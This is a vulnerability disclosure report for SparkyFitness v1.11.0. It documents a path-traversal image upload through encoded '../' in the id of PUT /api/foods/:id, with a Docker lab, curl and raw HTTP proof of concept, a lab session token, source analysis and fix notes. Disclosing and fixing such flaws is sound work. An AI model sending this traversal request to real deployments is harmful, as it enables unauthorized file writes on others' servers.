### Vulnerability details

**Official website / Product:** https://github.com/CodeWithCJ/SparkyFitness

**Repository:** https://github.com/CodeWithCJ/SparkyFitness (stars at selection: 6652)

**Vulnerability type:** file_upload (path-traversal arbitrary image write; CWE-22 / CWE-434)

**Vulnerability versions:** v1.11.0 (Docker `codewithcj/sparkyfitness_server:v1.11.0`; audited tag `v1.11.0` / commit `0d8525e88ea7b116a92cd3aa35f622f7682201e2`)

**Vulnerability URL / Parameter:** Authenticated `PUT /api/foods/:id` path parameter `id` (URL-decoded `../../…`); multipart field `images`. Same sink on `PUT /api/meals/:id` and `POST /api/food-entries/:id/image`.

**Complex:** yes

### Verification procedure

1. Original `labs/sparkyfitness-r29-a9/` was removed. Rebuild the lab anywhere with the compose below (images `codewithcj/sparkyfitness:v1.11.0`, `codewithcj/sparkyfitness_server:v1.11.0`, `postgres:18.3-alpine`; Compose project `sparky-r29a9`). Frontend/Nginx host port **20909→80**; direct API port **20919→3010** (must hit the direct API — Nginx returns 405 on encoded `../`).

```bash
mkdir -p /tmp/sparky-r29a9-lab && cd /tmp/sparky-r29a9-lab
cat > .env <<'EOF'
SPARKY_FITNESS_DB_USER=sparky
SPARKY_FITNESS_DB_PASSWORD=LabDbPass_r29a9
SPARKY_FITNESS_API_ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
BETTER_AUTH_SECRET=r29a9LabBetterAuthSecretBase64Pad==
SPARKY_FITNESS_FRONTEND_URL=http://127.0.0.1:20909
SPARKY_FITNESS_ADMIN_EMAIL=admin@lab.local
SPARKY_FITNESS_FRONTEND_PORT=20909
ALLOW_PRIVATE_NETWORK_CORS=true
SPARKY_FITNESS_FORCE_EMAIL_LOGIN=true
SPARKY_FITNESS_DISABLE_SIGNUP=false
EOF
cat > docker-compose.yml <<'EOF'
services:
  sparkyfitness-db:
    image: postgres:18.3-alpine
    container_name: sparkyfitness-db
    environment:
      POSTGRES_DB: sparkyfitness_db
      POSTGRES_USER: ${SPARKY_FITNESS_DB_USER}
      POSTGRES_PASSWORD: ${SPARKY_FITNESS_DB_PASSWORD}
    volumes:
      - ./postgresql:/var/lib/postgresql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U $${POSTGRES_USER} -d $${POSTGRES_DB}"]
      interval: 10s
      timeout: 5s
      retries: 10
      start_period: 30s
    networks:
      - sparkyfitness-network

  sparkyfitness-server:
    image: codewithcj/sparkyfitness_server:v1.11.0
    environment:
      SPARKY_FITNESS_DB_HOST: sparkyfitness-db
      SPARKY_FITNESS_DB_PORT: 5432
      SPARKY_FITNESS_DB_NAME: sparkyfitness_db
      SPARKY_FITNESS_DB_USER: ${SPARKY_FITNESS_DB_USER}
      SPARKY_FITNESS_DB_PASSWORD: ${SPARKY_FITNESS_DB_PASSWORD}
      SPARKY_FITNESS_FRONTEND_URL: ${SPARKY_FITNESS_FRONTEND_URL}
      SPARKY_FITNESS_API_ENCRYPTION_KEY: ${SPARKY_FITNESS_API_ENCRYPTION_KEY}
      BETTER_AUTH_SECRET: ${BETTER_AUTH_SECRET}
      NODE_ENV: production
      SPARKY_FITNESS_SERVER_PORT: 3010
      SPARKY_FITNESS_ADMIN_EMAIL: ${SPARKY_FITNESS_ADMIN_EMAIL}
      SPARKY_FITNESS_DISABLE_SIGNUP: ${SPARKY_FITNESS_DISABLE_SIGNUP:-false}
      SPARKY_FITNESS_FORCE_EMAIL_LOGIN: ${SPARKY_FITNESS_FORCE_EMAIL_LOGIN:-true}
      ALLOW_PRIVATE_NETWORK_CORS: ${ALLOW_PRIVATE_NETWORK_CORS:-true}
      HTTP_PROXY: ""
      HTTPS_PROXY: ""
      NO_PROXY: "*"
    ports:
      - "20919:3010"
    volumes:
      - ./backup:/app/SparkyFitnessServer/backup
      - ./uploads:/app/SparkyFitnessServer/uploads
    depends_on:
      sparkyfitness-db:
        condition: service_healthy
    networks:
      - sparkyfitness-network

  sparkyfitness-frontend:
    image: codewithcj/sparkyfitness:v1.11.0
    ports:
      - "${SPARKY_FITNESS_FRONTEND_PORT:-20909}:80"
    environment:
      SPARKY_FITNESS_FRONTEND_URL: ${SPARKY_FITNESS_FRONTEND_URL}
      SPARKY_FITNESS_SERVER_HOST: sparkyfitness-server
      SPARKY_FITNESS_SERVER_PORT: 3010
    depends_on:
      - sparkyfitness-server
    networks:
      - sparkyfitness-network

networks:
  sparkyfitness-network:
    driver: bridge
EOF
COMPOSE_PROJECT_NAME=sparky-r29a9 docker compose up -d
# expect: sparkyfitness-db Healthy; sparky-r29a9-sparkyfitness-server-1 / sparky-r29a9-sparkyfitness-frontend-1 Started
# frontend http://127.0.0.1:20909 ; direct API http://127.0.0.1:20919
```

2. Sign in as ordinary user `userb@lab.local` / `LabUserB123!` (admin fallback `admin@lab.local` / `LabAdmin123!`; register via the frontend on first bring-up — admin email matches `SPARKY_FITNESS_ADMIN_EMAIL` in `.env`) and obtain Cookie `sparky.session_token` (the token in the PoC below is from the verified session; replace after expiry).
3. Build the 340-byte JPEG (MD5 `8d38a7482a381499f42340d03d6df1a8`) and send the traversal upload to the direct API:

```bash
# reconstruct the PoC JPEG (byte-identical to the hex body in the HTTP below)
python3 - <<'PY'
import binascii, pathlib
hexdata = (
"ffd8ffe000104a46494600010100000100010000ffdb00430008060607060508"
"0707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720"
"222c231c1c2837292c30313434341f27393d38323c2e333432ffc0000b080001"
"000101011100ffc4001f00000105010101010101000000000000000001020304"
"05060708090a0bffc400b5100002010303020403050504040000017d01020300"
"041105122131410613516107227114328191a1082342b1c11552d1f024336272"
"82090a161718191a25262728292a3435363738393a434445464748494a535455"
"565758595a636465666768696a737475767778797a838485868788898a929394"
"95969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9"
"cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffda"
"0008010100003f007f46dce24a28a28a2803ffd9"
)
pathlib.Path('/tmp/pwn.jpg').write_bytes(binascii.unhexlify(hexdata))
print(len(pathlib.Path('/tmp/pwn.jpg').read_bytes()))
PY
curl -sS -D- -o /tmp/sf-resp.json \
  -X PUT 'http://127.0.0.1:20919/api/foods/%2e%2e%2f%2e%2e%2fEVIDENCE_R29A9' \
  -H 'Origin: http://127.0.0.1:20909' \
  -H 'Accept: application/json' \
  -H "Cookie: sparky.session_token=<SESSION>" \
  -F 'images=@/tmp/pwn.jpg;type=image/jpeg;filename=pwn.jpg'
```

Or replay the complete HTTP below (JPEG hex-encoded; decoding the trailing base64 regenerates the on-the-wire binary multipart).
4. Express decodes `:id` to `../../EVIDENCE_R29A9`. `finalizeUploadedImages` → `entityDirFor('foods', id)` → `path.join(uploads, 'foods', '../../EVIDENCE_R29A9')` writes `/app/SparkyFitnessServer/EVIDENCE_R29A9/<uuid>-pwn.jpg`.
5. `updateFood` then fails on the non-UUID id (HTTP **500**), but the write already completed. Verify inside the container:

```bash
docker exec sparky-r29a9-sparkyfitness-server-1 \
  ls -la /app/SparkyFitnessServer/EVIDENCE_R29A9/
docker exec sparky-r29a9-sparkyfitness-server-1 \
  md5sum /app/SparkyFitnessServer/EVIDENCE_R29A9/*-pwn.jpg
docker exec sparky-r29a9-sparkyfitness-server-1 \
  sh -c 'realpath /app/SparkyFitnessServer/EVIDENCE_R29A9 /app/SparkyFitnessServer/uploads'
```

Expected output (Docker-verified):

```
=== FS PROOF ===
total 12
drwxr-xr-x    2 root     root          4096 Nov  1 23:16 .
drwxr-xr-x    1 root     root          4096 Nov  1 23:16 ..
-rw-r--r--    1 root     root           340 Nov  1 23:16 f2582565-6f3c-4ed7-9d4a-e4b5bfdc8e09-pwn.jpg
FILE=/app/SparkyFitnessServer/EVIDENCE_R29A9/f2582565-6f3c-4ed7-9d4a-e4b5bfdc8e09-pwn.jpg
8d38a7482a381499f42340d03d6df1a8  /app/SparkyFitnessServer/EVIDENCE_R29A9/f2582565-6f3c-4ed7-9d4a-e4b5bfdc8e09-pwn.jpg
340 /app/SparkyFitnessServer/EVIDENCE_R29A9/f2582565-6f3c-4ed7-9d4a-e4b5bfdc8e09-pwn.jpg
=== layout ===
uploads_realpath=/app/SparkyFitnessServer/uploads
evidence_realpath=/app/SparkyFitnessServer/EVIDENCE_R29A9
```

MD5 must be `8d38a7482a381499f42340d03d6df1a8` (matches the JPEG reconstructed in step 3). The UUID filename prefix changes per write; size 340 and MD5 stay the same.

### Complete vulnerability PoC

Complete HTTP request as sent on the wire. Below is the **complete** request with the JPEG file part encoded as hex (`Content-Transfer-Encoding: hex`) so the markdown stays text-safe while preserving every byte; decoding the hex regenerates the identical 340-byte JPEG (MD5 `8d38a7482a381499f42340d03d6df1a8`). The on-the-wire Content-Length remains the original binary multipart length **507**.

```http
PUT /api/foods/%2e%2e%2f%2e%2e%2fEVIDENCE_R29A9 HTTP/1.1
Host: 127.0.0.1:20919
User-Agent: r29-a9-poc/1.0
Accept: application/json
Origin: http://127.0.0.1:20909
Cookie: sparky.session_token=sQkJBUmxC95iP9ItZc7QavSJ6QYADw5e.tXjqJMUen6B40MVHhIKvdxExYvCqYOPbn8XHPItV51c%3D
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr29a9poc
Content-Length: 507
Connection: close

------WebKitFormBoundaryr29a9poc
Content-Disposition: form-data; name="images"; filename="pwn.jpg"
Content-Type: image/jpeg
Content-Transfer-Encoding: hex

ffd8ffe000104a46494600010100000100010000ffdb00430008060607060508
0707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720
222c231c1c2837292c30313434341f27393d38323c2e333432ffc0000b080001
000101011100ffc4001f00000105010101010101000000000000000001020304
05060708090a0bffc400b5100002010303020403050504040000017d01020300
041105122131410613516107227114328191a1082342b1c11552d1f024336272
82090a161718191a25262728292a3435363738393a434445464748494a535455
565758595a636465666768696a737475767778797a838485868788898a929394
95969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9
cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffda
0008010100003f007f46dce24a28a28a2803ffd9
------WebKitFormBoundaryr29a9poc--

```

Full raw request as base64 (decode to recover the exact binary multipart accepted on the wire):

```
UFVUIC9hcGkvZm9vZHMvJTJlJTJlJTJmJTJlJTJlJTJmRVZJREVOQ0VfUjI5QTkg
SFRUUC8xLjENCkhvc3Q6IDEyNy4wLjAuMToyMDkxOQ0KVXNlci1BZ2VudDogcjI5
LWE5LXBvYy8xLjANCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KT3JpZ2luOiBo
dHRwOi8vMTI3LjAuMC4xOjIwOTA5DQpDb29raWU6IHNwYXJreS5zZXNzaW9uX3Rv
a2VuPXNRa0pCVW14Qzk1aVA5SXRaYzdRYXZTSjZRWUFEdzVlLnRYanFKTVVlbjZC
NDBNVkhoSUt2ZHhFeFl2Q3FZT1BibjhYSFBJdFY1MWMlM0QNCkNvbnRlbnQtVHlw
ZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9LS0tLVdlYktpdEZvcm1C
b3VuZGFyeXIyOWE5cG9jDQpDb250ZW50LUxlbmd0aDogNTA3DQpDb25uZWN0aW9u
OiBjbG9zZQ0KDQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlyMjlhOXBvYw0KQ29u
dGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJpbWFnZXMiOyBmaWxl
bmFtZT0icHduLmpwZyINCkNvbnRlbnQtVHlwZTogaW1hZ2UvanBlZw0KDQr/2P/g
ABBKRklGAAEBAAABAAEAAP/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQd
Gh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/AAAsIAAEAAQEB
EQD/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQD
BQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoW
FxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5
eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU
1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2gAIAQEAAD8Af0bc4kooooooA//Z
DQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlyMjlhOXBvYy0tDQo=
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Access-Control-Allow-Origin: http://127.0.0.1:20909
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: mcp-session-id,www-authenticate
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Content-Length: 33
Date: Sun, 01 Nov 2026 23:16:59 GMT
Connection: close

{"error":"Internal Server Error"}
```

Verification result notes:

- HTTP 500 `{"error":"Internal Server Error"}` is returned **after** the disk write (ownership/UUID check fails); it does not undo the write.
- Container path: `/app/SparkyFitnessServer/EVIDENCE_R29A9/f2582565-6f3c-4ed7-9d4a-e4b5bfdc8e09-pwn.jpg` (340 bytes).
- `realpath`: evidence dir = `/app/SparkyFitnessServer/EVIDENCE_R29A9`; uploads = `/app/SparkyFitnessServer/uploads` (write is outside the uploads root).
- MD5 `8d38a7482a381499f42340d03d6df1a8` matches the JPEG reconstructed in step 3.
- The same encoded traversal via frontend Nginx (20909) returns 405; the same backend process remains exploitable on the direct API / docker network (lab published 20919; production API exposure or in-network reachability has the same effect).
- Stored names are `randomUUID()-basename` with an image MIME allowlist, so this PoC proves **arbitrary image write outside the uploads tree**, not webshell/getshell.

### Vulnerability analysis

In `SparkyFitnessServer/middleware/imageUpload.ts`, `entityDirFor` builds `path.join(baseUploadsDir, domain, entityId)` with **no** UUID check and **no** rejection of `..` segments. The same file guards orphan-image deletion with `absolute.startsWith(baseUploadsDir + path.sep)`, but the **write** path lacks the equivalent constraint.

`foodCrudRoutes.ts` `PUT /:id` calls `finalizeUploadedImages(..., id)` **before** `foodService.updateFood` (which fails for a non-UUID id), so the traversal write completes before the business error. `mealRoutes.ts` `PUT /:id` and `foodEntryRoutes.ts` `POST /:id/image` share the same sink.

Node `path.join` resolves relative `..`: `join('/app/.../uploads','foods','../../EVIDENCE_R29A9')` → `/app/.../EVIDENCE_R29A9`. Absolute-form `entityId` did not escape in this environment; the working primitive is relative `../` segments.

Trigger / sink source (full path and line numbers):

```typescript
# File: SparkyFitnessServer/middleware/imageUpload.ts
# Lines: 16-18, 38-40, 227-257
const baseUploadsDir = process.env.SPARKY_FITNESS_CUSTOM_UPLOADS_DIRECTORY
  ? path.resolve(process.env.SPARKY_FITNESS_CUSTOM_UPLOADS_DIRECTORY)
  : path.join(__dirname, '../uploads');


function entityDirFor(domain: ImageDomain, entityId: string): string {
  return path.join(baseUploadsDir, domain, entityId);
}

async function finalizeUploadedImages(
  files: unknown,
  domain: ImageDomain,
  entityId: string
): Promise<string[]> {
  const uploaded = Array.isArray(files)
    ? files.filter(isStagedFile)
    : isStagedFile(files)
      ? [files]
      : [];
  if (uploaded.length === 0) {
    return [];
  }

  const targetDir = entityDirFor(domain, entityId);
  await fsp.mkdir(targetDir, { recursive: true });

  const webPaths: string[] = [];
  for (const file of uploaded) {
    const target = path.join(targetDir, file.filename);
    try {
      await fsp.rename(file.path, target);
    } catch {
      // rename() fails across filesystems/mounts; fall back to copy + unlink.
      await fsp.copyFile(file.path, target);
      await fsp.unlink(file.path).catch(() => {});
    }
    webPaths.push(`/uploads/${domain}/${entityId}/${file.filename}`);
  }

  return webPaths;
}
```

```typescript
# File: SparkyFitnessServer/routes/foodCrudRoutes.ts
# Lines: 1030-1067
router.put('/:id', authenticate, uploadImages, async (req, res, next) => {
  const { id } = req.params;
  if (!id) {
    return res.status(400).json({ error: 'Food ID is required.' });
  }
  try {
    const foodData = parseFoodBody(req);

    // `images` is the client's desired order, with __new__<n> placeholders
    // marking where each uploaded file belongs. A client that sends `images`
    // without any files is performing a removal and/or a reorder.
    const uploadedPaths = await finalizeUploadedImages(
      stagedFilesFrom(req),
      'foods',
      id
    );
    if (foodData.images !== undefined || uploadedPaths.length > 0) {
      foodData.images = applyImageOrder(foodData.images, uploadedPaths);
    }

    const updatedFood = await foodService.updateFood(req.userId, id, foodData);
    res.status(200).json(updatedFood);
  } catch (error) {
    // @ts-expect-error TS(2571): Object is of type 'unknown'.
    if (error.message.startsWith('Forbidden')) {
      // @ts-expect-error TS(2571): Object is of type 'unknown'.
      return res.status(403).json({ error: error.message });
    }
    // @ts-expect-error TS(2571): Object is of type 'unknown'.
    if (error.message === 'Food not found or not authorized to update.') {
      // @ts-expect-error TS(2571): Object is of type 'unknown'.
      return res.status(404).json({ error: error.message });
    }
    next(error);
  } finally {
    await cleanupStagedImages(req);
  }
});
```

### Fix notes

1. Before `finalizeUploadedImages` / `entityDirFor` / `removeEntityImageDir`, require `entityId` to match a UUID (or another strict allowlist); reject values containing `..`, path separators, or percent-encoded dots.
2. After resolving the absolute path, apply the same `isWithinUploadsRoot` / `startsWith(baseUploadsDir + sep)` check used on delete; refuse the write on failure.
3. Run finalize only after ownership and ID-format checks succeed; failed requests must not leave files in the target directory.
4. Do not treat frontend/gateway filtering of `%2e%2e` as the sole defense (direct API still triggers the sink).
